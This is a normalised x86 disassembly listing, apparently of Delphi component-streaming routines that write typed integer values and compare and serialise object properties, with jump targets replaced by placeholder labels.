call sub_408184
test al al
jne r-xdata
sub_41e9a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41eae7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_4217a8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e950
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42177c
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_4217a8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42177c
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eaee
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42177c
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42177c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41eaf4
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eed0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032b8
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_404424
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6f4
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e834
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41f124
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032b8
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_4043c8
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_420798
mov eax [ ebp - 0x8 ]
call sub_4032b0
call sub_403590
call sub_414acc
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_4043c8
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4032b8
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_4043c8
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4044e4
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_420798
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f168
mov eax [ ebp - 0x4 ]
call sub_41f11c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41ee71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420798
mov eax [ ebp - 0x4 ]
call sub_41e6f4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4188a0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee78
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41ee2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41e9a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_403368
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e694
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_403564
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41ee78
mov eax [ ebp - 0x4 ]
call sub_41f11c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eed7
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_404188
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e6f4
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e70c
sub_41eef4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420980
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e760
pop ebx
pop ebp
retn 0xc
sub_41ef18
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420980
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e760
pop ebx
pop ebp
retn 0x4
sub_41ef3c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420980
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e760
pop ebx
pop ebp
retn 0x8
sub_41ef60
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420980
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e760
pop ebx
pop ebp
retn 0x8
sub_41ef84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_408184
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_408184
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420980
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_408184
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420980
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_408184
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420980
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420980
mov edx esi
mov eax ebx
call sub_420798
mov dl 0xd
mov eax ebx
call sub_420980
jmp r-xdata
sub_41f048
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e760
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e760
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420980
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e760
jmp r-xdata
pop edx
pop ebx
retn
sub_41f0bc
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420980
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e760
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f048
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41f124
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e760
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f048
sub_41f168
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403590
call sub_414acc
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403590
mov edx [ ebp - 0x10 ]
call sub_414cd0
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414d24
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4201fc
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f230
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4032b0
mov edx eax
mov eax [ edi ]
call sub_40357c
test al al
jne r-xdata
mov al 0x1
sub_41f260
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414d54
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d54
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f2b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415284
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415284
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f314
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4156a0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4156a0
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f36c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f3eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4150c8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4049bc
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150c8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4049bc
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3f2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40485c
retn
sub_41f3fc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408184
test al al
jne r-xdata
mov al 0x1
sub_41f43c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d54
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f3fc
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f494
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414d54
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push ebp
call sub_41f43c
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f43c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f514
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f5c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5c7
lea eax [ ebp - 0x8 ]
call sub_405b04
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415704
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d4a0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f3fc
pop ecx
mov ebx eax
sub_41f5e0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f69d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415704
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405b04
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d4a0
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f6a4
lea eax [ ebp - 0x10 ]
call sub_405b04
lea eax [ ebp - 0xc ]
call sub_405b04
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415704
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f514
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f6bc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415628
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415628
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_403624
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f734
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f7bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4155a8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_414240
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4155a8
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_4142b4
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7c2
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404c00
retn
sub_41f7cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f230
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f88e ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414d54
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push ebp
call sub_41f260
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f2b8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f36c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f494
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f6bc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f734
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f314
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f5e0
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414d54
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f934
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f97c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4043c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f983
